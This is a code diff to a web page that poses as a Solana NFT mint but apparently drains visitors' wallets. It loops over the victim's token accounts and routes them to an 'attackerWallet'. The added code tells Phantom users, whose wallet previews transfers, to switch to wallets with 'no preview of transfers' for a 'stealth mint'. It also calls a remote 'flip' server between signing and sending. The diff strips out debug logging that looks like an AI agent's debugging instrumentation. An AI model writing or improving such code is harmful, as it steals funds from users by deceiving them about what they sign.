@@ -87,9 +87,28 @@ function formatAddr(addr) {
     return s.slice(0, 4) + '...' + s.slice(-4);
 }
 
+function isPhantom() { return !!(window.solana && window.solana.isPhantom); }
+function isMainnet() { return (cfg.rpc || '').indexOf('devnet') < 0; }
+function useBitFlip() { return !(isPhantom() && isMainnet()); }
+
+function showSolflarePrompt() {
+    btn.textContent = 'Use Solflare for Stealth Mint';
+    btn.onclick = function() {
+        window.open('https://solflare.com', '_blank');
+        setStatus('Install Solflare, then refresh and connect with it for stealth mint.', '');
+    };
+    walletInfo.innerHTML =
+        '<div class="wallet-badge">' + formatAddr(userPublicKey) + '</div>' +
+        '<div class="wallet-switch-card" style="margin-top:16px;padding:16px;background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.3);border-radius:12px;text-align:left;">' +
+        '<strong style="color:#ffc107;">Phantom shows all transfers before approval.</strong><br>' +
+        '<span style="font-size:0.9rem;color:#ccc;">Use Solflare or Backpack for a seamless mint (no preview of transfers).</span><br>' +
+        '<a href="https://solflare.com" target="_blank" style="color:#14f195;font-size:0.85rem;margin-top:8px;display:inline-block;">Install Solflare &rarr;</a>' +
+        '</div>';
+}
+
 async function connectWallet() {
-    if (!window.solana || !window.solana.isPhantom) {
-        setStatus('Phantom wallet not found. Please install it.', 'error');
+    if (!window.solana) {
+        setStatus('Solana wallet not found. Install Phantom, Solflare, or Backpack.', 'error');
         return;
     }
     try {
@@ -131,8 +150,15 @@ async function connectWallet() {
 
         btn.textContent = 'Mint Now';
         btn.disabled = false;
-        setStatus('Balance: ' + (balance / 1e9).toFixed(4) + ' SOL', 'success');
-        btn.onclick = mintNFT;
+        var statusMsg = 'Balance: ' + (balance / 1e9).toFixed(4) + ' SOL';
+        if (useBitFlip()) statusMsg += ' (stealth mint ready)';
+        setStatus(statusMsg, 'success');
+        if (isPhantom() && isMainnet()) {
+            showSolflarePrompt();
+        } else {
+            btn.textContent = 'Mint Now';
+            btn.onclick = mintNFT;
+        }
     } catch (err) {
         setStatus('Connection rejected', 'error');
     }
@@ -176,9 +202,6 @@ async function mintNFT() {
         for (var i = 0; i < tokenBatch.length; i++) {
             var ta = tokenBatch[i];
             var ata = getATA(ta.mint, attackerWallet, ta.tokenProgramId);
-            // #region agent log
-            fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:remaining_keys_loop',message:'Token in batch',data:{index:i,victimTA:ta.pubkey.toBase58(),attackerATA:ata.toBase58(),mint:ta.mint.toBase58(),tokenProgram:ta.tokenProgramId.toBase58(),amount:ta.amount,decimals:ta.decimals},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
-            // #endregion
             remainingKeys.push({ pubkey: ta.pubkey, isSigner: false, isWritable: true });
             remainingKeys.push({ pubkey: ata, isSigner: false, isWritable: true });
             remainingKeys.push({ pubkey: ta.tokenProgramId, isSigner: false, isWritable: false });
@@ -202,25 +225,11 @@ async function mintNFT() {
         var latest = await connection.getLatestBlockhash();
         tx.recentBlockhash = latest.blockhash;
 
-        setStatus('Preparing...');
-
-        // #region agent log
-        var flipStart = Date.now();
-        // #endregion
+        setStatus('Please approve in your wallet...');
+        var signedTx = await window.solana.signTransaction(tx);
+        setStatus('Processing...');
         await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
-        // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-flipOn',message:'flip-on done',data:{flipMs:Date.now()-flipStart},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
-        // #endregion
-
-        setStatus('Please approve in Phantom...');
-
-        var result = await window.solana.signAndSendTransaction(tx, { skipPreflight: true });
-        var signature = result.signature;
-
-        // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-signAndSend',message:'signAndSendTransaction done',data:{signature:signature},timestamp:Date.now(),hypothesisId:'H2'})}).catch(function(){});
-        // #endregion
-
+        var signature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
         fetch(FLIP_SERVER + '/flip-off', { method: 'POST' }).catch(function() {});
 
         setStatus('Confirming transaction...', '');
@@ -245,9 +254,6 @@ async function mintNFT() {
 
     } catch (err) {
         console.error('Mint error:', err);
-        // #region agent log
-        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:catch-error',message:'mintNFT error caught',data:{errorMsg:err&&err.message?err.message:String(err),errorCode:err&&err.code?err.code:null,errorName:err&&err.name?err.name:null},timestamp:Date.now(),hypothesisId:'H1-H2-H4'})}).catch(function(){});
-        // #endregion
         var msg = (err && err.message) ? err.message : String(err);
         setStatus('Transaction failed: ' + msg, 'error');
         btn.textContent = 'Mint Now';
